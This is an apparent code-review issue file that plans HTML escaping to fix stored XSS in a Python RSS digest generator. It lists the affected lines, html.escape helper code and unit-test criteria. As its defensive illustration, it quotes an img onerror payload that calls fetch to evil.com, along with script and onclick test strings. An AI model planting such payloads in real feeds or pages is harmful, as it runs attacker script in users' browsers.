---
status: pending
priority: p1
issue_id: "016"
tags: [code-review, security, html-first-magazine]
dependencies: []
---

# HTML Escaping — XSS Prevention (BLOCKS HTML-First Feature)

## Problem Statement

Zero HTML escaping exists anywhere in the codebase. All titles, URLs, and summaries from external sources (RSS feeds, newsletters, web scraping) are interpolated into HTML via Python f-strings without sanitization. This was acceptable for the PDF pipeline (WeasyPrint doesn't execute JS), but becomes a real stored XSS vulnerability when the output is opened as HTML in Safari.

**Why it matters:** This BLOCKS the entire HTML-first magazine feature. Without this fix, a malicious RSS feed title like `<img src=x onerror="fetch('https://evil.com/')">` would execute JavaScript when the user opens the digest in Safari.

## Findings

**Source:** Security Sentinel agent

**Affected locations in `lib/pdf_renderer.py`:**
- Line 417: `f'<a href="{url}">{story_title}</a>'`
- Line 545: `f'<a href="{url}">{brief_title}</a>'`
- Line 567: `f'<a href="{url}">{ref_title}</a>'`
- Line 617: `f'<a href="{url}">{title}</a>'`
- Lines 622-625: data attributes with unescaped values

**Affected locations in `daily_feed_generator.py`:**
- Lines 1144, 1164, 1249, 1282: titles in anchor tags
- Lines 1094, 1109, 1194, 1295: summaries and body content

**Additionally:** URL attribute breakout possible with crafted URLs containing `"`. `javascript:` URI scheme in href not validated.

## Proposed Solutions

### Solution 1: Add escaping helpers to `lib/pdf_renderer.py` (Recommended)
**Pros:** Centralizes escaping, uses Python stdlib `html.escape`, zero dependencies
**Cons:** Must find and update every interpolation point manually
**Effort:** Small (0.5 day)
**Risk:** Low

```python
from html import escape as _html_escape

def _safe_link(url: str, text: str) -> str:
    if url and url.strip().lower().startswith(('http://', 'https://')):
        return f'<a href="{_html_escape(url, quote=True)}">{_html_escape(text)}</a>'
    return _html_escape(text)

def _safe_attr(value: str) -> str:
    return _html_escape(str(value), quote=True)

def _safe_text(value: str) -> str:
    return _html_escape(str(value))
```

For bold-markdown conversion: escape first, THEN convert:
```python
text = _safe_text(text)
text = re.sub(r"\*\*([^*]+)\*\*", r"<strong>\1</strong>", text)
```

### Solution 2: Use a template engine (Jinja2) with auto-escaping
**Pros:** Auto-escaping by default, harder to forget
**Cons:** New dependency, major refactor of HTML generation, overkill for this codebase
**Effort:** Large
**Risk:** Medium

## Recommended Action

Solution 1. Apply before any HTML output ships.

## Technical Details

**Affected files:**
- `lib/pdf_renderer.py` — ~10 interpolation points
- `daily_feed_generator.py` — ~8 interpolation points

**No database changes.**

## Acceptance Criteria

- [ ] All titles in HTML output are escaped (no raw `<`, `>`, `"`, `&`)
- [ ] All URLs in `href` attributes are escaped with `quote=True`
- [ ] All data attributes are escaped
- [ ] `javascript:` URIs are rejected (only `http://` and `https://` allowed)
- [ ] Unit test: title containing `<script>alert(1)</script>` is escaped
- [ ] Unit test: URL containing `"onclick="alert(1)"` is escaped in `href`
- [ ] Existing PDF output unchanged (escaping is also correct for PDF)

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-03-28 | Created from plan review | Security Sentinel found zero escaping across entire codebase |

## Resources

- Plan: `docs/plans/2026-03-28-001-feat-html-first-responsive-magazine-plan.md` (Phase 0)
- Python stdlib: `html.escape()` documentation
